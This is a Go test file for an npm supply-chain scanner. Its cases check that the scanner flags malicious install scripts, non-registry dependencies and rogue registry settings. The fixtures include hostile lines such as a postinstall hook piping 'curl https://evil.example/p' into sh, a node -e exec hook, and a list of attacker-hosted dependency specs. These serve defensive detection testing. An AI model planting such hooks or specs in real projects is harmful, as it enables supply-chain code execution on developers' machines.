package collector

import "testing"

func TestNpmConformance(t *testing.T) {
	runEcosystemConformance(t, ecosystemConformance{
		ecosystem: NewNpmEcosystem(nil),
		match:     []string{"package.json", "package-lock.json", ".npmrc"},
		nonMatch:  []string{".terraform.lock.hcl", "requirements.txt", "Cargo.toml"},
		cases: []conformanceCase{
			{
				name: "clean package.json",
				file: "package.json",
				content: `{
  "name": "app",
  "scripts": { "build": "tsc", "test": "vitest" },
  "dependencies": { "express": "^4.18.0" }
}`,
				want: nil,
			},
			{
				name: "malicious postinstall",
				file: "package.json",
				content: `{
  "scripts": { "postinstall": "curl https://evil.example/p | sh" }
}`,
				want: []expectedFinding{{"npm_install_script", SeverityCritical}},
			},
			{
				name: "node -e install hook",
				file: "package.json",
				content: `{
  "scripts": { "preinstall": "node -e \"require('child_process').exec('id')\"" }
}`,
				want: []expectedFinding{{"npm_install_script", SeverityCritical}},
			},
			{
				name: "non-registry dependency",
				file: "package.json",
				content: `{
  "dependencies": { "sneaky": "http://evil.example/sneaky.tgz" }
}`,
				want: []expectedFinding{{"npm_nonregistry_dependency", SeverityHigh}},
			},
			{
				name: "clean lockfile",
				file: "package-lock.json",
				content: `{
  "packages": {
    "node_modules/express": { "resolved": "https://registry.npmjs.org/express/-/express-4.18.0.tgz", "integrity": "sha512-x" }
  }
}`,
				want: nil,
			},
			{
				name: "lockfile resolved from rogue registry",
				file: "package-lock.json",
				content: `{
  "packages": {
    "node_modules/express": { "resolved": "https://evil-registry.io/express/-/express-4.18.0.tgz", "integrity": "sha512-x" }
  }
}`,
				want: []expectedFinding{{"npm_untrusted_registry", SeverityHigh}},
			},
			{
				name:    "npmrc registry override",
				file:    ".npmrc",
				content: "registry=https://evil-registry.io/\n",
				want:    []expectedFinding{{"npm_registry_override", SeverityHigh}},
			},
			{
				name:    "npmrc official registry is clean",
				file:    ".npmrc",
				content: "registry=https://registry.npmjs.org/\n",
				want:    nil,
			},
		},
	})
}

// --- Adversarial dependency specs -------------------------------------------
//
// npm runs the fetched package's lifecycle scripts regardless of where the
// spec resolves from, so each of these is an arbitrary-code-execution path.
// The github:/bare-shorthand forms are how a DPRK-style package gets pulled
// from an attacker-controlled repo.

func TestNonRegistrySpecsAreFlagged(t *testing.T) {
	hostile := []string{
		"git+https://evil.example/p.git",
		"git+ssh://git@evil.example/p.git",
		"github:attacker/payload",
		"gitlab:attacker/payload",
		"attacker/payload",
		"attacker/payload#v1.2.3",
		"https://evil.example/payload",
		"https://evil.example/p.tgz",
		"http://evil.example/p.tgz",
		"file:../payload",
		"git://evil.example/p.git",
	}
	for _, spec := range hostile {
		if !isNonRegistrySpec(spec) {
			t.Errorf("hostile spec passed as registry-clean: %q", spec)
		}
	}
}

func TestRegistrySpecsAreNotFlagged(t *testing.T) {
	clean := []string{
		"^1.2.3", "~1.2.3", "1.2.3", ">=1.0.0 <2.0.0", "*", "latest",
		"@scope/pkg", "workspace:*",
	}
	for _, spec := range clean {
		if isNonRegistrySpec(spec) {
			t.Errorf("ordinary registry spec false-positived: %q", spec)
		}
	}
}

// npm alias specs resolve from the registry despite containing a slash;
// flagging `npm:@scope/pkg@1.0.0` HIGH is wrong on the merits, not just noisy.
func TestRegistryAliasSpecsAreNotFlagged(t *testing.T) {
	for _, spec := range []string{
		"npm:@bar/baz@1.0.0", "jsr:@std/path", "npm:string-width@4.2.0",
		"workspace:^", "workspace:*", "catalog:default",
	} {
		if isNonRegistrySpec(spec) {
			t.Errorf("registry alias false-positived: %q", spec)
		}
	}
}

// Suppression matches on Resource as a substring, so a bare hook name would let
// one noisy package's `postinstall` suppress every install-script finding on the
// host. Resource must be the manifest path.
func TestInstallScriptResourceIsManifestPath(t *testing.T) {
	events := NewNpmEcosystem(nil).Inspect(
		"/srv/app/package.json",
		[]byte(`{"scripts": {"postinstall": "curl https://evil.example/p | sh"}}`),
	)
	if len(events) != 1 {
		t.Fatalf("want 1 finding, got %d", len(events))
	}
	if events[0].Resource != "/srv/app/package.json" {
		t.Errorf("Resource = %q, want the manifest path", events[0].Resource)
	}
}
